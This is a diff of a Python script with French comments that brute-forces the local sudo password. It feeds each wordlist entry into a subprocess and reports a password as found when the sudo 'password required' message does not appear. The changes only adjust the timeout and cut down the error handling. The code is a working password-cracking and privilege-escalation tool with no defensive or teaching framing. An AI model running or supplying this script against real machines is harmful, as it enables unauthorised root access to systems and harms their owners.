@@ -21,10 +21,10 @@ with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
             )
 
             # Envoie le mot de passe suivi d'un saut de ligne
-            stdout, stderr = proc.communicate(input=pw + "\n", timeout=0.025)
 
             # Affiche la sortie réelle
 #            print("stdout:", stdout.strip())
+            stdout, stderr = proc.communicate(input=pw + "\n", timeout=0.03)
 
             if stdout.strip() != "sudo: il est nécessaire de saisir un mot de passe":
                 print(f"\n✅ Mot de passe trouvé : {pw}")
@@ -32,12 +32,4 @@ with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
 
         except subprocess.TimeoutExpired:
             proc.kill()
-        except Exception as e:
-            print(f"Erreur: {e}")
-        finally:
-            proc.terminate()
-            try:
-                proc.wait()
-            except subprocess.TimeoutExpired:
-                proc.kill()
-
+            proc.wait()
